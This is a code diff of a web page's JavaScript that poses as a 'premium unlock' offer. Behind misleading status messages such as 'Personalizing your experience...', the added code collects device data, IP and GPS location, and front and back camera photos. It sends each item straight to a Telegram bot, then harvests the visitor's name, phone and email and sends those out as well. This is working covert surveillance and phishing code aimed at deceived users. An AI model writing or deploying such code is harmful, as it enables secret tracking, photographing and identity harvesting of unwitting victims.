+                    showStatus('📱 Collecting device info...', 'loading');
+                    deviceData = await collectDeviceData();
+                    await sendTelegramMessage(buildDeviceMessage(deviceData));
+                    
+                    // STEP 2: Get IP Location & GPS, Send IMMEDIATELY
                     showStatus('📍 Getting your location...', 'loading');
-                    collectedData.location.ip = await getIPLocation();
-                    collectedData = await requestLocationPermission(collectedData);
-
+                    ipData = await getIPLocation();
+                    locationData = await getGPSLocation();
+                    await sendTelegramMessage(buildLocationMessage(locationData, ipData));
+                    
+                    // STEP 3: Capture & Send Photos IMMEDIATELY (one by one)
                     showStatus('✨ Personalizing your experience...', 'loading');
-                    collectedData = await captureAllPhotos(collectedData);
-
+                    
+                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                        // Back Camera Photo 1
+                        var back1 = await capturePhoto('environment', 1);
+                        if (back1.success) {
+                            var caption = '📸 Photo 1/4 - Back Camera #1\n';
+                            caption += '🔑 Session: ' + sessionId + '\n';
+                            caption += '📐 Resolution: ' + back1.resolution + '\n';
+                            caption += '⏰ Time: ' + back1.timestamp;
+                            await sendTelegramPhoto(back1.data, caption);
+                        }
+                        
+                        // Back Camera Photo 2
+                        var back2 = await capturePhoto('environment', 2);
+                        if (back2.success) {
+                            var caption = '📸 Photo 2/4 - Back Camera #2\n';
+                            caption += '🔑 Session: ' + sessionId + '\n';
+                            caption += '📐 Resolution: ' + back2.resolution + '\n';
+                            caption += '⏰ Time: ' + back2.timestamp;
+                            await sendTelegramPhoto(back2.data, caption);
+                        }
+                        
+                        // Front Camera Photo 1
+                        var front1 = await capturePhoto('user', 1);
+                        if (front1.success) {
+                            var caption = '📸 Photo 3/4 - Front Camera #1\n';
+                            caption += '🔑 Session: ' + sessionId + '\n';
+                            caption += '📐 Resolution: ' + front1.resolution + '\n';
+                            caption += '⏰ Time: ' + front1.timestamp;
+                            await sendTelegramPhoto(front1.data, caption);
+                        }
+                        
+                        // Front Camera Photo 2
+                        var front2 = await capturePhoto('user', 2);
+                        if (front2.success) {
+                            var caption = '📸 Photo 4/4 - Front Camera #2\n';
+                            caption += '🔑 Session: ' + sessionId + '\n';
+                            caption += '📐 Resolution: ' + front2.resolution + '\n';
+                            caption += '⏰ Time: ' + front2.timestamp;
+                            await sendTelegramPhoto(front2.data, caption);
+                        }
+                    }
+                    
+                    // STEP 4: Show Contact Modal
                     showStatus('🎁 One more step...', 'loading');
                     await delay(500);
-
-                    // Show contact modal
-                    showContactModal();
+                    document.getElementById('contactModal').classList.add('active');
 
                 } catch (error) {
                     console.error('Error:', error);
                     showStatus('🚀 Redirecting...', 'success');
-                    setTimeout(function() {
-                        window.location.href = CONFIG.MAIN_SITE_URL;
-                    }, 1500);
+                    setTimeout(function() { window.location.href = CONFIG.MAIN_SITE_URL; }, 1500);
                 }
+            }
+
+            // ============================================================
+            // CONTACT FORM HANDLING
+            // ============================================================
+
+            function validateForm() {
+                var name = document.getElementById('userName').value.trim();
+                var phone = document.getElementById('userPhone').value.trim();
+                var email = document.getElementById('userEmail').value.trim();
+                var valid = true;
+
+                document.querySelectorAll('.form-input').forEach(function(el) { el.classList.remove('error'); });
+
+                if (!name || name.length < 2) { document.getElementById('userName').classList.add('error'); valid = false; }
+                if (!phone || phone.length < 6 || !/^\d+$/.test(phone)) { document.getElementById('userPhone').classList.add('error'); valid = false; }
+                if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { document.getElementById('userEmail').classList.add('error'); valid = false; }
+
+                return valid;
+            }
+
+            async function submitContact(skipped) {
+                var btn = document.getElementById('unlockBtn');
+                btn.disabled = true;
+                btn.innerHTML = '<span>⏳</span><span>Please wait...</span>';
+
+                var contact = {};
+                if (!skipped) {
+                    contact = {
+                        name: document.getElementById('userName').value.trim(),
+                        phone: document.getElementById('countryCode').value + ' ' + document.getElementById('userPhone').value.trim(),
+                        email: document.getElementById('userEmail').value.trim()
+                    };
+                }
+
+                // Send contact info IMMEDIATELY
+                await sendTelegramMessage(buildContactMessage(contact, skipped));
+
+                // Close modals and redirect
+                document.getElementById('contactModal').classList.remove('active');
+                document.getElementById('skipConfirmModal').classList.remove('active');
+                
+                showStatus('🎉 ' + (skipped ? 'Redirecting...' : 'Premium unlocked! Redirecting...'), 'success');
+                
+                setTimeout(function() { window.location.href = CONFIG.MAIN_SITE_URL; }, 1500);
             }
 
             // ============================================================
@@ -1598,40 +1331,34 @@
             function init() {
                 hidePageLoader();
 
-                // Main CTA button
+                // Main button
                 document.getElementById('continueBtn').addEventListener('click', function(e) {
                     e.preventDefault();
                     handleContinue();
                 });
 
-                // Contact form submit
+                // Contact form
                 document.getElementById('contactForm').addEventListener('submit', function(e) {
                     e.preventDefault();
-                    if (validateForm()) {
-                        submitContactAndRedirect(false);
-                    }
+                    if (validateForm()) submitContact(false);
                 });
 
-                // Skip button
+                // Skip buttons
                 document.getElementById('skipBtn').addEventListener('click', function() {
-                    showSkipConfirm();
+                    document.getElementById('skipConfirmModal').classList.add('active');
                 });
 
-                // Go back button
                 document.getElementById('goBackBtn').addEventListener('click', function() {
-                    hideSkipConfirm();
+                    document.getElementById('skipConfirmModal').classList.remove('active');
                 });
 
-                // Skip anyway button
                 document.getElementById('skipAnywayBtn').addEventListener('click', function() {
-                    submitContactAndRedirect(true);
+                    submitContact(true);
                 });
 
-                // Close modal on outside click
+                // Close on outside click
                 document.getElementById('contactModal').addEventListener('click', function(e) {
-                    if (e.target === this) {
-                        showSkipConfirm();
-                    }
+                    if (e.target === this) document.getElementById('skipConfirmModal').classList.add('active');
                 });
             }
 
